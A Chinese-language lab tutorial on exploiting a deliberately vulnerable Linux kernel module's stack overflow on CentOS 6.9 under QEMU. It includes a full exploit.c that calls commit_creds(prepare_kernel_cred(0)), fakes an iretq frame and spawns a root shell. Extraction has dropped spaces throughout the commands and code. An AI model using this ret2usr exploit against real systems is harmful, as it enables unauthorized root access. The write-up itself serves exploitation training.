**0x01 ****环境搭建**

文件: centos6.9 x64位,linux-kernel-2.6.32.29 内核源码

工具: qemu

平台: archlinux

打开终端，创建一个使用10G 的qcow2 文件

Qemu-img create –fqcow2 centos.qcow2 10G

开始安装centos

Qemu-system-x86\_64–hda centos.qco2 –m 1024M –boot –d –enable-kvm

等待系统安装完后，进入系统，安装gcc, make,wget 等编译所需的工具

从kernel.org 中下载linux-2.6.32.29 内核源码到centos 中

Tar –jxvflinux-2.6.32.29.tar.bz2 来解压

Cd linux-2.6.32.29

Zcat /boot/config>.config Makemenuconfig 来配置内核选项

转到该处(Processor type and features-> 进去) 不选,即取消掉CONFIG*CC*STACKPROTECTOR保护

之后推出，make && make modules\_install&& makeinstall 来等待内核编译安装完

编译完成后，在内核源码目录下，有vmlinux 文件，将其传输到主机上

调试环境测试

Qemu-system-x86\_64–had centos.qcow2 –m 1024M –enable-kvm –s –S

在另一个终端打开gdb

Gdb>file vmlinux

这时centos 会正式启动，注意选择启动项

在buggy\_write 位置下断点，可以方便的去调试

现在讲一下漏洞的情况

   intbuggy\_write(struct file \*file,

            constchar \*buf,

            unsignedlong len) {

 

       char data\[8\];

       copy\_from\_user(data, buf, len);

       return len;

   }

可以看到在buggy*write **函数中**copy*from\_user 函数讲用户传递来的数据buf复制到data 中，data位局部变量，在这一过程程序没有检查复制数据的大小，从而形成了溢出漏洞。

**0x03 ****漏洞提权**

用ida打开sbof.ko 模块

![](../Images/135d2b9161ad930c76b8a6536727a076.png)

  

从中可以知道，栈的大小位0x20字节，我们要覆盖返回地址，所以就需要复制0x30 大小的数据，即0x20+8字节rbp + 8 字节返回地。

返回地址要设置位我们的payload 所在的内存位置，其payload 为commit*creds(prepare*kernel\_cred(0)) 提权函数。、

获取commit*creds **和**prepare*kernel\_cred 函数的内存地址的方法为

Cat /sys/kallsyms|grep commit\_creds

Cat /sys/kallsyms|grep prepare\_kernel\_cred

提权函数从内核空间到用户空间，这涉及到栈的问题，从内核空间通过iret 指令来返回到用户空间，iret 指令会反向弹出保存时的寄存器的数据，其形式为

   \* |ss     | Lower

   \* |rsp    |

   \* |rflags |

   \* |cs     |

   \* |rip    |

由此，我们可以通过伪造伪造一个类似的frame 当iret 执行时，可以返回到rip 所指定的地址处继续执行。

0x04 获得shell

**通过上述的思路，完成****exploit.c**

   #include <stdio.h>

   #include <stdlib.h>

   #include <sys/mman.h>

   #include <sys/stat.h>

   #include <fcntl.h>

   #include <string.h>

   #include <unistd.h>

   #include <stdint.h>

   #include <sys/user.h>

 

   #define STACK\_SIZE (1024 \* 1024)

   char ownstack\[STACK\_SIZE\];

   struct fake\_frame {

       void \*rip;         // shell()

       uint64\_t cs;       // %cs

       uint64\_t rflags;   // rflags

       void \*rsp;         // %rsp

       uint64\_t ss;       // %ss

   } \_\_attribute\_\_((packed)) ff;

 

   #define KERNCALL \_\_attribute\_\_((regparm(3)))

   void\* (\*prepare\_kernel\_cred)(void\*) KERNCALL = (void\*) 0xffffffff81093000;

   void\* (\*commit\_creds)(void\*) KERNCALL = (void\*) 0xffffffff81092b20;

 

   voidshell(void) {

       execl("/bin/sh", "sh", 0);

   }

 

   voidpayload(void) {

       commit\_creds(prepare\_kernel\_cred(0));

       asm("mov $ff, %rsp;\\n"

                "swapgs;\\n"

                "iretq;");

   }

   voidsetup\_ff(void) {

       asm("xorq %rax, %rax;\\n"

            "movw %cs,%ax;\\n"

            "movq %rax, ff+8;\\n"

            "pushfq;   popq ff+16;\\n"

            "movw %ss,%ax;\\n"

            "movq %rax,ff+32;\\n");

       ff.rip = &shell;

       ff.rsp = ownstack + (STACK\_SIZE / 2);

   }

 

   intmain()

   {

       FILE \*fd;

       char buf\[8\*6\];

       memset (buf, 'A', sizeof (buf));

       \*((void\*\*) (buf+8\*5)) = &payload;

       int ret = 0;

       unsignedlong addr;

       char dummy;

       char sname\[512\];

 

       // setup fake frame

       fprintf(stdout, "\[+\] preparing fake frame");

       setup\_ff();

 

       // write payload

       fprintf(stdout, "\[+\] writing payload to /proc/buggy");

       fd = fopen("/proc/buggy", "w");

       if(fd == NULL) {

            perror("fopen()");

            return\-1;

       }

       fwrite(buf, sizeof(buf), 1, fd);

       fclose(fd);

 

       return0;

   }
